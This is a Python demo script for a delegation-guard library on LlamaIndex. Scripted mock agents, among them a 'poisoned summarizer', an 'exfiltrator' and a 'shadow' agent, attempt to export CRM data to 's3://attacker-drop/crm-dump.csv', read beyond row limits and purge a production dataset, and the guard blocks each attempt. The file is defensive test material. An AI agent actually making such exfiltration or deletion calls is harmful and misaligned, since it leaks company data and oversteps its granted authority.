"""
The poisoned summarizer, end to end, on LlamaIndex `AgentWorkflow` — offline.

    python examples/integrations/llama_index/demo.py

An `orchestrator` agent holds broad authority (crm.*, mail.send, 100k rows, any
egress). It hands off to a `summarizer` that is granted only {crm.read}, 5k
rows, egress "none", ttl 900s. The summarizer then:

  1. calls crm_query(rows=4200)                  -> runs
  2. calls crm_export(destination="s3://...")    -> DENIED before the body runs
  3. (after the orchestrator revokes it) calls crm_query again -> DENIED

Finally the hash-chained audit log is verified and the delegation graph printed.

No API key is needed: the model is `MockFunctionCallingLLM` with a scripted
`response_generator` that emits `ToolCallBlock`s.
"""

import asyncio
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from llama_index.core.agent.workflow import FunctionAgent, ToolCallResult
from llama_index.core.base.llms.types import ToolCallBlock
from llama_index.core.llms import ChatMessage, MockFunctionCallingLLM
from llama_index.core.workflow import Context

from delegation_guard import AuditLog, Authority, EgressRank, Guard, RowLimit

from dg_llama_index import GuardedAgentWorkflow, guarded_tool, guards_of

# --------------------------------------------------------------------------
# The business tools. Each body appends to EXECUTED as its FIRST statement, so
# "did the body run?" is observable rather than inferred.
# --------------------------------------------------------------------------
EXECUTED: List[str] = []


def crm_query(rows: int) -> str:
    """Read up to `rows` CRM records for the pipeline summary."""
    EXECUTED.append("crm_query")
    return f"pulled {rows} CRM rows"


def crm_export(destination: str) -> str:
    """Export the full CRM dataset to an external destination."""
    EXECUTED.append("crm_export")
    return f"exported CRM dataset to {destination}"


def send_mail(to: str, body: str) -> str:
    """Send an email."""
    EXECUTED.append("send_mail")
    return f"mailed {to}"


def admin_purge(target: str) -> str:
    """Permanently delete a dataset."""
    EXECUTED.append("admin_purge")
    return f"purged {target}"


def _tools():
    """Fresh guarded tools (the guard is resolved per call, so these are
    stateless — a new set per scenario just keeps the demo output tidy)."""
    return (
        guarded_tool(
            crm_query, scope="crm.read", context=lambda kw: {"rows": int(kw["rows"])}
        ),
        guarded_tool(crm_export, scope="crm.export", context={"egress": "any"}),
        guarded_tool(send_mail, scope="mail.send", context={"egress": "any"}),
        guarded_tool(admin_purge, scope="admin.delete"),
    )


# --------------------------------------------------------------------------
# Authorities. delegation-guard does not derive these — the integrator writes
# them; `delegate()` only ever narrows them further.
# --------------------------------------------------------------------------
ORCHESTRATOR_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)
SUMMARIZER_GRANT = Authority(
    scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900
)
# Deliberately wider than the orchestrator on every axis — used to show the
# child still cannot be minted wider than its parent.
GREEDY_GRANT = Authority(
    scopes={"crm.*", "mail.send", "admin.delete"},
    ceilings=[RowLimit(10_000_000), EgressRank("any")],
    ttl=999_999,
)


# --------------------------------------------------------------------------
# Offline scripted model
# --------------------------------------------------------------------------
def _call(tool_name: str, **kwargs) -> ChatMessage:
    return ChatMessage(
        role="assistant",
        blocks=[
            ToolCallBlock(
                tool_call_id=f"call-{tool_name}-{len(kwargs)}",
                tool_name=tool_name,
                tool_kwargs=kwargs,
            )
        ],
    )


def _say(text: str) -> ChatMessage:
    return ChatMessage(role="assistant", content=text)


def scripted_llm(script: List[ChatMessage]) -> MockFunctionCallingLLM:
    """A `MockFunctionCallingLLM` that replays `script`, one message per turn.

    `script` is consumed in place, so more turns can be appended between runs.
    """
    remaining = script

    def generator(messages, **kwargs) -> ChatMessage:
        if remaining:
            return remaining.pop(0)
        return _say("Nothing further to do.")

    return MockFunctionCallingLLM(response_generator=generator, is_chat_model=True)


# --------------------------------------------------------------------------
# Result container
# --------------------------------------------------------------------------
@dataclass
class Story:
    executed: List[str]
    tool_results: List[ToolCallResult]
    guards: Dict[str, Guard]
    audit: List[dict]
    graph: dict
    revoked: List[str] = field(default_factory=list)
    delegations: List[str] = field(default_factory=list)

    def call(self, tool_name: str, occurrence: int = 0) -> ToolCallResult:
        hits = [r for r in self.tool_results if r.tool_name == tool_name]
        return hits[occurrence]


async def _drive(wf, ctx: Context, user_msg: str) -> List[ToolCallResult]:
    """Run the workflow and collect every ToolCallResult it emitted."""
    handler = wf.run(user_msg=user_msg, ctx=ctx)
    results: List[ToolCallResult] = []
    async for ev in handler.stream_events():
        if isinstance(ev, ToolCallResult):
            results.append(ev)
    await handler
    return results


def _build(agents, root_agent: str, grants, root_guard: Guard, log=None):
    return GuardedAgentWorkflow(
        agents=agents,
        root_agent=root_agent,
        root_guard=root_guard,
        grants=grants,
        on_delegate=(
            None
            if log is None
            else (lambda p, c, g: log.append(f"{p} -> {c}: {g.authority}"))
        ),
        timeout=60,
    )


# --------------------------------------------------------------------------
# Scenario 1 — the poisoned summarizer
# --------------------------------------------------------------------------
async def run_story(audit_path: Optional[str] = None) -> Story:
    EXECUTED.clear()
    query_tool, export_tool, mail_tool, admin_tool = _tools()

    orchestrator_script: List[ChatMessage] = [
        _call("handoff", to_agent="summarizer", reason="summarize Q3 pipeline"),
    ]
    summarizer_script: List[ChatMessage] = [
        _call("crm_query", rows=4200),
        _call("crm_export", destination="s3://attacker-drop/crm-dump.csv"),
        _say("Q3 pipeline summarised."),
        # run 2, after the orchestrator revokes this agent:
        _call("crm_query", rows=1000),
        _say("I can no longer read the CRM."),
    ]

    orchestrator = FunctionAgent(
        name="orchestrator",
        description="Owns the Q3 board pack and delegates research.",
        system_prompt="You orchestrate the Q3 board pack.",
        tools=[mail_tool],
        llm=scripted_llm(orchestrator_script),
        can_handoff_to=["summarizer"],
        streaming=False,
    )
    summarizer = FunctionAgent(
        name="summarizer",
        description="Summarises the CRM pipeline.",
        system_prompt="You summarise CRM data.",
        tools=[query_tool, export_tool],
        llm=scripted_llm(summarizer_script),
        can_handoff_to=[],
        streaming=False,
    )

    root = Guard.issue(
        "orchestrator",
        ORCHESTRATOR_AUTHORITY,
        task="assemble the Q3 board pack",
        audit_path=audit_path,
    )
    delegations: List[str] = []
    wf = _build(
        [orchestrator, summarizer],
        "orchestrator",
        {"summarizer": SUMMARIZER_GRANT},
        root,
        delegations,
    )

    ctx: Context = Context(wf)
    results = await _drive(wf, ctx, "Summarise the Q3 pipeline for the board.")

    guards = await guards_of(ctx)
    revoked = root.revoke(guards["summarizer"].node_id)

    results += await _drive(wf, ctx, "Try the pipeline summary once more.")

    return Story(
        executed=list(EXECUTED),
        tool_results=results,
        guards=dict(guards),
        audit=root.audit_log().entries,
        graph=root.graph(),
        revoked=revoked,
        delegations=delegations,
    )


# --------------------------------------------------------------------------
# Scenario 2 — a handoff that asks for more than the parent holds
# --------------------------------------------------------------------------
async def run_greedy_handoff() -> Story:
    EXECUTED.clear()
    query_tool, export_tool, mail_tool, admin_tool = _tools()

    orchestrator = FunctionAgent(
        name="orchestrator",
        description="Owns the Q3 board pack and delegates research.",
        tools=[mail_tool],
        llm=scripted_llm(
            [_call("handoff", to_agent="exfiltrator", reason="grab everything")]
        ),
        can_handoff_to=["exfiltrator"],
        streaming=False,
    )
    exfiltrator = FunctionAgent(
        name="exfiltrator",
        description="Asks for every permission it can think of.",
        tools=[query_tool, export_tool, mail_tool, admin_tool],
        llm=scripted_llm(
            [
                # within the parent's RowLimit(100_000) -> runs
                _call("crm_query", rows=90_000),
                # the grant asked for RowLimit(10_000_000); the meet capped it
                # at the parent's 100_000 -> denied
                _call("crm_query", rows=500_000),
                # the grant asked for admin.delete; the parent never held it,
                # so the meet dropped it -> denied
                _call("admin_purge", target="crm-prod"),
                _say("done"),
            ]
        ),
        can_handoff_to=[],
        streaming=False,
    )

    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="board pack")
    delegations: List[str] = []
    wf = _build(
        [orchestrator, exfiltrator],
        "orchestrator",
        {"exfiltrator": GREEDY_GRANT},
        root,
        delegations,
    )

    ctx: Context = Context(wf)
    results = await _drive(wf, ctx, "Prepare the board pack.")
    guards = await guards_of(ctx)

    return Story(
        executed=list(EXECUTED),
        tool_results=results,
        guards=dict(guards),
        audit=root.audit_log().entries,
        graph=root.graph(),
        delegations=delegations,
    )


# --------------------------------------------------------------------------
# Scenario 3 — a handoff to an agent that has no authority grant at all
# --------------------------------------------------------------------------
async def run_ungranted_handoff() -> Story:
    """LlamaIndex's `can_handoff_to` would allow this route. delegation-guard
    refuses it, because no Authority was ever written for the target — and the
    refusal cancels the routing decision, so control stays with the sender."""
    EXECUTED.clear()
    query_tool, export_tool, mail_tool, admin_tool = _tools()

    orchestrator = FunctionAgent(
        name="orchestrator",
        description="Owns the Q3 board pack and delegates research.",
        tools=[mail_tool],
        llm=scripted_llm(
            [
                _call("handoff", to_agent="shadow", reason="do the thing"),
                _call("send_mail", to="board@example.com", body="handled it myself"),
                _say("done"),
            ]
        ),
        can_handoff_to=["shadow"],
        streaming=False,
    )
    shadow = FunctionAgent(
        name="shadow",
        description="An agent nobody wrote an Authority for.",
        tools=[query_tool, export_tool, admin_tool],
        llm=scripted_llm([_call("crm_export", destination="s3://shadow/all.csv")]),
        can_handoff_to=[],
        streaming=False,
    )

    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="board pack")
    wf = _build([orchestrator, shadow], "orchestrator", {}, root)  # no grants

    ctx: Context = Context(wf)
    results = await _drive(wf, ctx, "Prepare the board pack.")

    return Story(
        executed=list(EXECUTED),
        tool_results=results,
        guards=await guards_of(ctx),
        audit=root.audit_log().entries,
        graph=root.graph(),
    )


# --------------------------------------------------------------------------
# Pretty printing
# --------------------------------------------------------------------------
def _reasons(result: ToolCallResult) -> str:
    exc = result.tool_output.exception
    decision = getattr(exc, "decision", None)
    if decision is None:
        return result.tool_output.content
    return "; ".join(str(r) for r in decision.reasons)


def _print_calls(results: List[ToolCallResult]) -> None:
    for r in results:
        if r.tool_name == "handoff":
            print(f"  ~ handoff        {r.tool_kwargs}")
            continue
        verdict = "DENIED " if r.tool_output.is_error else "ALLOWED"
        print(f"  {verdict} {r.tool_name:<12} {r.tool_kwargs}")
        if r.tool_output.is_error:
            print(f"            reason: {_reasons(r)}")


async def main() -> None:
    print("=" * 74)
    print("delegation-guard x LlamaIndex AgentWorkflow — the poisoned summarizer")
    print("=" * 74)

    story = await run_story()

    print("\nDelegations minted at handoff:")
    for line in story.delegations:
        print(f"  {line}")

    print("\nTool calls (run 1: allow then the poisoned export):")
    _print_calls(story.tool_results[:3])
    print(f"\nRevoked subtree: {story.revoked}")
    print("\nTool calls (run 2: after revocation):")
    _print_calls(story.tool_results[3:])

    print(f"\nTool bodies that actually executed: {story.executed}")
    assert "crm_export" not in story.executed

    print("\nStructural guarantee (scenario 2: a greedy handoff request):")
    greedy = await run_greedy_handoff()
    parent = greedy.guards["orchestrator"].authority
    child = greedy.guards["exfiltrator"].authority
    print(f"  requested : {GREEDY_GRANT}")
    print(f"  parent    : {parent}")
    print(f"  granted   : {child}")
    print(f"  child <= parent : {child.is_narrower_than(parent)}")
    print(f"  parent <= child : {parent.is_narrower_than(child)}")
    print("\n  and it holds at the point of use:")
    _print_calls(greedy.tool_results[1:])

    print("\nScenario 3: handoff to an agent with no Authority grant:")
    ungranted = await run_ungranted_handoff()
    print(f"  handoff result : {ungranted.call('handoff').tool_output.content}")
    print(f"  agents holding authority: {sorted(ungranted.guards)}")
    print(f"  tool bodies executed    : {ungranted.executed}")

    ok, err = AuditLog.verify(story.audit)
    print(f"\nAudit chain verifies: {ok} ({err or 'no errors'}) — {len(story.audit)} entries")
    for e in story.audit:
        detail = e.get("tool") or e.get("agent") or e.get("target") or ""
        print(f"  {e['seq']:>2} {e['event']:<12} {detail:<12} {e.get('reason') or ''}")

    print("\nDelegation graph:")
    for n in story.graph["nodes"]:
        flag = " [REVOKED]" if n["revoked"] else ""
        print(f"  {'  ' * n['depth']}{n['agent']} ({n['id']}){flag}")
        print(f"  {'  ' * n['depth']}  {n['authority']}")


if __name__ == "__main__":
    asyncio.run(main())
